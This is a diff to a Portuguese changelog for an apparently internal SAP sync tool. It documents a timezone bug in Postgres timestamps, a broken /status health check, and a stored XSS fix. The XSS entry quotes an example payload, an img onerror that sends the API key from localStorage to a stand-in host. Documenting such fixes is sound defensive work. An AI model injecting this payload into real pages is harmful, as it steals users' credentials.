@@ -3,9 +3,45 @@
 Mudanças notáveis deste projeto. Formato inspirado em
 [Keep a Changelog](https://keepachangelog.com/pt-BR/1.1.0/).
 
-## [2026-07-16] — `/status` não mente mais: check inválido devolve 400, não "tudo verde"
+## [2026-07-16] — Horários 3h errados, XSS que vazava a API key, e `/status` que mentia
 
 ### Corrigido
+
+- **Todo horário de sincronização estava 3h no passado.** `datetime.now().isoformat()` produz
+  string **naive** (`'16:43:30'`); a coluna `data_hora_sincronizacao` é **`timestamptz`**, e o
+  Postgres assume **UTC** ao gravar → um evento das 16:43 BRT virava `16:43:30+00` = 13:43 BRT.
+  **O painel "Últimas sincronizações" mostrava tudo 3h errado.** Medido no banco:
+
+  | Entrada | Coluna | Resultado |
+  | --- | --- | --- |
+  | `'16:43:30'` (antes) | `timestamptz` | `16:43:30+00` ❌ 3h atrás |
+  | `'16:43:30-03:00'` (agora) | `timestamptz` | `19:43:30+00` ✅ instante certo |
+  | `'16:43:30-03:00'` | `timestamp` | `16:43:30` ✅ offset ignorado |
+  | `'16:43:30'` (antes) | `timestamp` | `16:43:30` ✅ idêntico |
+
+  Novo helper **`pipeline_core.agora_iso()`** (= `datetime.now().astimezone().isoformat()`),
+  usado nos 3 pontos que gravam hora (`prepare_data` + os 2 logs de sync). As 2 últimas linhas
+  da tabela acima são o motivo de dar para usar a **mesma** função nos dois tipos de coluna: o
+  Postgres **descarta** o offset em `timestamp without time zone`, então `data_hora_extracao`
+  não muda em nada. Um conserto, zero efeito colateral.
+
+  > ⚠️ **Linhas já gravadas continuam 3h erradas** — o fix não reescreve o passado. Como o log
+  > é podado (100 mais recentes na OS, 6 em oportunidades), elas somem sozinhas conforme novas
+  > cargas rodam. Corrigir à mão exigiria `UPDATE ... + interval '3 hours'` **só nas linhas
+  > anteriores ao deploy** — não feito, para não estragar as novas.
+
+- **XSS armazenado na página de sincronização → exfiltrava a `OS_API_KEY`.** `sincronizar.html`
+  interpolava dados do servidor em `innerHTML` **sem escape nenhum**. O vetor mais exposto:
+  `cliente` vem de **`ORDR.CardName` do SAP** e ia cru para a lista de "Buscar na Lista" — uma
+  razão social como `<img src=x onerror="fetch('http://x/'+localStorage.os_api_key)">` executava
+  no browser de quem abrisse a lista, e a página guarda a chave no `localStorage`. Também eram
+  sinks: `motivo`, `nped` (inclusive dentro de `value="..."`, permitindo **quebrar o atributo**),
+  os contadores do resumo, e `fmtTime`, que devolve o **ISO cru** quando a data não parseia.
+
+  Adicionado `esc()` (`& < > " '`) e aplicado em **todas** as interpolações de dado do servidor.
+  Verificado com o payload real: vira texto inerte, e a quebra de atributo também. Corrigido de
+  quebra `data.items.length` sem guard (`.length` de `undefined` exibia *"API no ar?"* — mensagem
+  enganosa: a API respondeu 200).
 
 - **`/status?checks=<nome inválido>` respondia `200 {"healthy": true}` sem ter checado NADA.**
   Um nome fora de `SELECTABLE_CHECKS` não casava com nenhum `if`, `checks` saía vazio e
